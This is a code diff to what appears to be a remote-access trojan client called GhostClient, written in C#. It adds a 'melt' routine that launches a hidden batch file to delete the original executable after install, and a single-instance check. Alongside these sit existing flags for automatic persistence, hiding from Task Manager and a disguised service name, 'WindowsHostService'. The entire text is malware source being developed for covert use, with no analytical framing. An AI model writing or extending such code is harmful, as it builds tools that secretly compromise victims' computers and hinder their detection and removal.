@@ -33,6 +33,8 @@ namespace GhostClient
         private static string CLIENT_ID = "__CLIENT_ID__";
         private static bool PERSIST = true;         // Auto-install persistence
         private static bool STEALTH = true;          // Hide from Task Manager
+        private static bool MELT = false;            // Self-delete after install
+        private static bool SINGLE_INSTANCE = false;  // Only one instance allowed
         private static string INSTALL_NAME = "WindowsHostService";
 
         private static string _hostname = "";
@@ -434,6 +436,22 @@ namespace GhostClient
 
         static void Main(string[] args)
         {
+            // ── SINGLE INSTANCE ──
+            if (SINGLE_INSTANCE)
+            {
+                try
+                {
+                    string currentExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                    string exeName = Path.GetFileNameWithoutExtension(currentExe);
+                    Process[] procs = Process.GetProcessesByName(exeName);
+                    if (procs.Length > 1)
+                    {
+                        Environment.Exit(0);
+                        return;
+                    }
+                } catch { }
+            }
+
             // ── STEALTH: Hide window immediately ──
             if (STEALTH)
             {
@@ -456,6 +474,34 @@ namespace GhostClient
             if (PERSIST)
             {
                 try { InstallPersistence(); } catch { }
+            }
+
+            // ── MELT: Self-delete original exe after install ──
+            if (MELT)
+            {
+                try
+                {
+                    string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                    if (!string.IsNullOrEmpty(_persistDir) && !exePath.ToLower().Contains(_persistDir.ToLower()))
+                    {
+                        // Create batch file to delete original
+                        string batPath = Path.GetTempPath() + "\\ghost_melt_" + Guid.NewGuid().ToString().Substring(0, 8) + ".bat";
+                        using (StreamWriter sw = new StreamWriter(batPath))
+                        {
+                            sw.WriteLine("@echo off");
+                            sw.WriteLine(":loop");
+                            sw.WriteLine("del /f /q \"" + exePath + "\" 2>nul");
+                            sw.WriteLine("if exist \"" + exePath + "\" goto loop");
+                            sw.WriteLine("del /f /q \"" + batPath + "\" 2>nul");
+                        }
+                        Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"")
+                        {
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            CreateNoWindow = true,
+                            UseShellExecute = false,
+                        });
+                    }
+                } catch { }
             }
 
             // ── STEALTH: Apply process hiding techniques ──
